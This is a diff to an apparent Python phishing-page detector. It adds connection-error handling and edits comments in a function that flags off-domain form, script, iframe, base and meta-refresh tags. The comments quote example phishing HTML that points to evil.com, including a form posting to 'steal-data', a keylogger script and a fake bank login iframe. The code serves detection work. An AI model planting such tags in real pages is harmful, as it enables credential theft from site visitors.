@@ -8,13 +8,18 @@ import requests
 
 def extraxt_html_content(url):
     #Send a GET request
-    response = requests.get(url)
+    try:
+        response = requests.get(url)
 
-    #Check if the request was unsuccessful
-    if response.status_code != 200:
-        print(f"Failed to retrieve page. Status code:", response.status_code)
+        #Check if the request was unsuccessful.
+        #If not return error.
+        if response.status_code != 200:
+            print(f"Failed to retrieve page. Status code:", response.status_code)
+        return response
+    except requests.exceptions.ConnectionError as error:
+        print(f"connection error: {error}")
+        return None
 
-    return response
 
 
 def extract_text_from_html(unfiltered):
@@ -93,14 +98,14 @@ def HTML_tag_analyser(HTML_raw, full_domain):
     #Convert the raw HTML string into a structured, searchable tree object which is stored in filtered.
     filtered = BeautifulSoup(HTML_raw.text, 'html.parser')
 
-    #initialise score and matched_tags variable
+    #Initialise score and matched_tags variable
     score = 0
     matched_tags = []
 
     #Iterates through all the form tags in the parsed HTML.
     #Gets the value of the action attribute of the form tag. The action attribute specifies where the form data should be sent when the form is submitted.
     #If actiontio attribute exists and does not contain the domain of URL being analysed and it starts with "http", it is considered suspicious because it indicates that the form is submitting data to an external site.
-    #example - <form action="https://evil.com/steal-data">
+    #Example - <form action="https://evil.com/steal-data">
     for form in filtered.find_all('form'):
         action = form.get('action', '')
         if action and domain not in action and action.startswith('http'):
@@ -109,7 +114,7 @@ def HTML_tag_analyser(HTML_raw, full_domain):
 
     #Iterates through all the script tags in the parsed HTML.
     #Get value of src attribute of the script tag. The src attribute specifies the URL of an external script file.        
-    #example - <script src="https://evil.com/keylogger.js"></script>
+    #Example - <script src="https://evil.com/keylogger.js"></script>
     for script in filtered.find_all('script'):
         src = script.get('src', '')
         if src and domain not in src and src.startswith('http'):
@@ -119,7 +124,7 @@ def HTML_tag_analyser(HTML_raw, full_domain):
     #Iterates through all the iframe tags in the parsed HTML.
     #Iframes are tool for including a cloned legitimate page (a real bank login) inside a phishing website.
     #Get value of isrc attribute of the iframe tag. The isrc attribute specifies the URL of an external iframe content.
-    #example - <iframe src="https://evil.com/fake-barclays-login"></iframe>
+    #Example - <iframe src="https://evil.com/fake-barclays-login"></iframe>
     for iframe in filtered.find_all('iframe'):
         isrc = iframe.get('src', '')
         if isrc and domain not in isrc:
@@ -130,7 +135,7 @@ def HTML_tag_analyser(HTML_raw, full_domain):
     #Iterates through all the base tags in the parsed HTML.
     #base tag sets default URL for all link on page. if base tag points to external website, it can be used to send password from login form to the attacker's server instead of the real bank.
     #Get value of href attribute of the base tag.
-    #example - <base href="https://evil.com/">       
+    #Example - <base href="https://evil.com/">       
     for base in filtered.find_all('base'):
         href = base.get('href', '')
         if href and domain not in href and href.startswith('http'):
@@ -138,9 +143,9 @@ def HTML_tag_analyser(HTML_raw, full_domain):
             matched_tags.append(('base', href))
 
 
-    #meta tag with http-equiv="refresh" can be used to automatically redirect users to another page after a certain amount of time. 
-    #if the content attribute of meta tag doesnt contain the domain of the URL being analysed, it may be considered that the page is trying to redirect users to an external site.
-    #example - <meta http-equiv="refresh" content="0; url=https://evil.com/fake-login">
+    #Meta tag with http-equiv="refresh" can be used to automatically redirect users to another page after a certain amount of time. 
+    #If the content attribute of meta tag doesnt contain the domain of the URL being analysed, it may be considered that the page is trying to redirect users to an external site.
+    #Example - <meta http-equiv="refresh" content="0; url=https://evil.com/fake-login">
     for meta in filtered.find_all('meta'):
         http_eq = meta.get('http-equiv', '')
         content = meta.get('content', '')
